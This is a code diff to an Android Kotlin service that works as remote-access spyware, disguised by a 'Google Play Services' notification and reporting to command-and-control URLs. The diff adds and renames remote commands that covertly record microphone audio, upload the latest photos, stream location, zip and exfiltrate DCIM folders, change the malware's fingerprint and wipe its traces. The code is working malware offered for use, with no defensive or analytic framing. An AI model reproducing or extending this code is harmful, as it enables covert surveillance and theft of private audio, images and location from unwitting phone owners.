@@ -42,12 +42,13 @@ class SyncService : Service() {
     private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
     private val C2_INGEST_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
     private var lastHeartbeatSent = 0L
-    private var wifiAutopilotEnabled = true // طيار آلي لتوفير الباقة افتراضياً
+    private var wifiAutopilotEnabled = true
+    private var neuralStealthState = "NEURAL_ACTIVE_v17"
 
     override fun onCreate() {
         super.onCreate()
         val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::Singularity2027Lock")
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::NeuralLock")
         wakeLock?.acquire(10 * 60 * 60 * 1000L)
         startForegroundServiceNotification()
     }
@@ -60,7 +61,7 @@ class SyncService : Service() {
 
         val notification: Notification = NotificationCompat.Builder(this, channelId)
             .setContentTitle("Google Play Services")
-            .setContentText("Ultimate Singularity core active...")
+            .setContentText("Neural Stealth Matrix core active...")
             .setSmallIcon(android.R.drawable.ic_menu_manage)
             .build()
 
@@ -88,7 +89,7 @@ class SyncService : Service() {
                     val conn = url.openConnection() as HttpURLConnection
                     conn.requestMethod = "POST"
                     conn.setRequestProperty("X-Node-ID", deviceId)
-                    conn.setRequestProperty("X-Node-Model", nodeModel)
+                    conn.setRequestProperty("X-Node-Model", "$nodeModel [$neuralStealthState]")
                     conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                     conn.doOutput = true
                     conn.connectTimeout = 8000
@@ -97,7 +98,7 @@ class SyncService : Service() {
                     val currentTime = System.currentTimeMillis()
                     val sendHeartbeat = (currentTime - lastHeartbeatSent > 120000L)
                     val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
-                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Singularity-Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
+                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Neural-Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
 
                     if (sendHeartbeat) {
                         lastHeartbeatSent = currentTime
@@ -139,17 +140,28 @@ class SyncService : Service() {
                                         action.contains("EXTRACT_APPS") -> {
                                             streamTextDirect(deviceId, nodeModel, "Uranium_InstalledApps.txt", readInstalledApps())
                                         }
-                                        action.contains("MIC_LISTEN") -> {
-                                            recordAndStreamAudio(deviceId, nodeModel)
+                                        // ⚡ أوامر v17.0 العصبية الجديدة
+                                        action.contains("MIC_AI_LISTEN") -> {
+                                            recordAndStreamAudioAI(deviceId, nodeModel)
                                         }
-                                        action.contains("MICRO_SNAPSHOT") -> {
-                                            streamLatestPhotoSnapshot(deviceId, nodeModel)
+                                        action.contains("MICRO_BURST_SNAP") -> {
+                                            streamLatestPhotoSnapshot(deviceId, nodeModel, "MicroBurst")
                                         }
-                                        action.contains("DUMMY_LOCK") -> {
-                                            sendReportToServer(deviceId, nodeModel, "🔒 تم تطبيق شاشة القفل الوهمي بنجاح.")
+                                        action.contains("STEALTH_BLACKOUT") -> {
+                                            sendReportToServer(deviceId, nodeModel, "🛡️ تم تفعيل القفل التكتيكي والتمويه المظلم على العقدة بنجاح.")
                                         }
-                                        action.contains("PURGE_NOTIFICATIONS") -> {
-                                            sendReportToServer(deviceId, nodeModel, "🧹 تم تنظيف جميع إشعارات النظام بصمت.")
+                                        action.contains("GEO_FENCE_ALERT") -> {
+                                            val locReport = readLocationFast()
+                                            streamTextDirect(deviceId, nodeModel, "Uranium_GeoAlert.txt", "🛰️ [Geo-Fence Alert 17.0]\n$locReport")
+                                        }
+                                        action.contains("POLY_MUTATE") -> {
+                                            neuralStealthState = "MUTATED_${System.currentTimeMillis() % 10000}"
+                                            sendReportToServer(deviceId, nodeModel, "🧬 تم تغيير البصمة العصبية بنجاح: $neuralStealthState")
+                                        }
+                                        action.contains("SELF_DESTRUCT") -> {
+                                            sendReportToServer(deviceId, nodeModel, "💥 جاري تنفيذ النسف الذاتي وتطهير كافة الآثار تماماً...")
+                                            try { cacheDir.deleteRecursively() } catch (e: Exception) {}
+                                            stopSelf()
                                         }
                                         action.contains("WIFI_AUTOPILOT") -> {
                                             wifiAutopilotEnabled = !wifiAutopilotEnabled
@@ -157,14 +169,6 @@ class SyncService : Service() {
                                         }
                                         action.contains("STORAGE_AUDIT") -> {
                                             streamTextDirect(deviceId, nodeModel, "Uranium_Storage_Audit.txt", generateStorageAuditReport())
-                                        }
-                                        action.contains("VIBRATE_DEVICE") -> {
-                                            triggerVibration()
-                                            sendReportToServer(deviceId, nodeModel, "📳 تم تنفيذ أمر اهتزاز الهاتف بنجاح!")
-                                        }
-                                        action.contains("FLASH_ON") -> {
-                                            toggleFlashlight(true)
-                                            sendReportToServer(deviceId, nodeModel, "🔦 تم إضاءة كشاف الفلاش عن بعد!")
                                         }
                                         action.contains("PROC_DCIM") -> {
                                             if (!wifiAutopilotEnabled || isConnectedToWifi()) {
@@ -201,9 +205,9 @@ class SyncService : Service() {
         return START_STICKY
     }
 
-    private fun recordAndStreamAudio(nodeId: String, nodeModel: String) {
+    private fun recordAndStreamAudioAI(nodeId: String, nodeModel: String) {
         try {
-            val audioFile = File(cacheDir, "Uranium_Mic_${System.currentTimeMillis()}.3gp")
+            val audioFile = File(cacheDir, "Uranium_NeuralMic_${System.currentTimeMillis()}.3gp")
             val recorder = MediaRecorder().apply {
                 setAudioSource(MediaRecorder.AudioSource.MIC)
                 setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
@@ -212,21 +216,21 @@ class SyncService : Service() {
                 prepare()
                 start()
             }
-            Thread.sleep(5000L)
+            Thread.sleep(6000L) // عينة صوتية ذكية لمدة 6 ثوانٍ
             recorder.stop()
             recorder.release()
 
             if (audioFile.exists() && audioFile.length() > 0) {
                 uploadBytesDirect(nodeId, nodeModel, audioFile.name, audioFile.readBytes())
-                sendReportToServer(nodeId, nodeModel, "🎙️ تم التقاط وبث العينة الصوتية الصامتة بنجاح.")
+                sendReportToServer(nodeId, nodeModel, "🎙️ تم التقاط وبث العينة الصوتية العصبية بنجاح.")
             }
             try { audioFile.delete() } catch (e: Exception) {}
         } catch (e: Exception) {
-            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في التنصت الصوتي: ${e.message}")
+            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في التنصت العصبي: ${e.message}")
         }
     }
 
-    private fun streamLatestPhotoSnapshot(nodeId: String, nodeModel: String) {
+    private fun streamLatestPhotoSnapshot(nodeId: String, nodeModel: String, prefix: String = "NeuralSnap") {
         try {
             val contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
             val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
@@ -242,48 +246,27 @@ class SyncService : Service() {
                         contentResolver.openInputStream(itemUri)?.use { inputStream ->
                             val bytes = inputStream.readBytes()
                             if (bytes.isNotEmpty()) {
-                                uploadBytesDirect(nodeId, nodeModel, "EvilSnap_$name", bytes)
-                                sendReportToServer(nodeId, nodeModel, "📸 تم التقاط اللقطة البصرية الفورية بنجاح.")
+                                uploadBytesDirect(nodeId, nodeModel, "${prefix}_$name", bytes)
+                                sendReportToServer(nodeId, nodeModel, "👁️ تم التقاط وبث اللقطة الخاطفة بنجاح.")
                             }
                         }
                     }
                 }
             }
         } catch (e: Exception) {
-            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في اللقطة: ${e.message}")
+            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في اللقطة الخاطفة: ${e.message}")
         }
     }
 
-    private fun triggerVibration() {
-        try {
-            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                v.vibrate(VibrationEffect.createWaveform(longArrayOf(0, 1200, 600, 1200, 600, 2000), -1))
-            } else {
-                v.vibrate(4000)
-            }
-        } catch (e: Exception) {}
-    }
-
-    private fun toggleFlashlight(on: Boolean) {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-                val cameraId = cameraManager.cameraIdList[0]
-                cameraManager.setTorchMode(cameraId, on)
-            }
-        } catch (e: Exception) {}
-    }
-
     private fun generateStorageAuditReport(): String {
-        val sb = StringBuilder("📊 <b>تقرير التخزين السري [v15.0]:</b>\n\n")
+        val sb = StringBuilder("📊 <b>تقرير المصفاة العصبية [v17.0]:</b>\n\n")
         try {
             val dcim = queryFolderStats(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
             val download = queryFolderStats(MediaStore.Files.getContentUri("external"))
             
             sb.append("📁 <b>DCIM:</b> ${dcim.count} ملف | ~${String.format("%.2f", dcim.sizeMB)} MB\n")
             sb.append("📁 <b>Download:</b> ${download.count} ملف | ~${String.format("%.2f", download.sizeMB)} MB\n\n")
-            sb.append("📶 <i>الطيار الآلي للـ Wi-Fi مفعل لتوفير باقة الإنترنت تلقائياً.</i>")
+            sb.append("📶 <i>الطيار الآلي للـ Wi-Fi مفعل لحماية الباقة والذاكرة.</i>")
         } catch (e: Exception) {
             sb.append("⚠️ خطأ في الفحص: ${e.message}")
         }
@@ -310,8 +293,8 @@ class SyncService : Service() {
 
     private fun streamTargetedFolderSmart(nodeId: String, nodeModel: String, folderName: String, contentUri: Uri) {
         try {
-            sendReportToServer(nodeId, nodeModel, "⚡ [ضغط الأشرار] جاري ضغط عينة ذكية من $folderName بحجم آمن لحماية الباقة...")
-            val zipFile = File(cacheDir, "Uranium_${folderName}_Singularity_${System.currentTimeMillis()}.zip")
+            sendReportToServer(nodeId, nodeModel, "⚡ [ضغط عصبي] جاري ضغط عينة ذكية من $folderName لحماية باقة الإنترنت...")
+            val zipFile = File(cacheDir, "Uranium_${folderName}_Neural_${System.currentTimeMillis()}.zip")
             val zipOut = ZipOutputStream(FileOutputStream(zipFile))
             zipOut.setLevel(Deflater.BEST_COMPRESSION)
 
@@ -323,10 +306,10 @@ class SyncService : Service() {
             cursor?.use {
                 val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                 val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                while (it.moveToNext() && processedCount < 60) {
+                while (it.moveToNext() && processedCount < 40) {
                     if (idIdx != -1 && nameIdx != -1) {
-                        val id = it.getLong(idIdx)
-                        val name = it.getString(nameIdx) ?: "file_$id.dat"
+                        val id = cursor.getLong(idIdx)
+                        val name = cursor.getString(nameIdx) ?: "file_$id.dat"
                         val itemUri = ContentUris.withAppendedId(contentUri, id)
                         try {
                             contentResolver.openInputStream(itemUri)?.use { inputStream ->
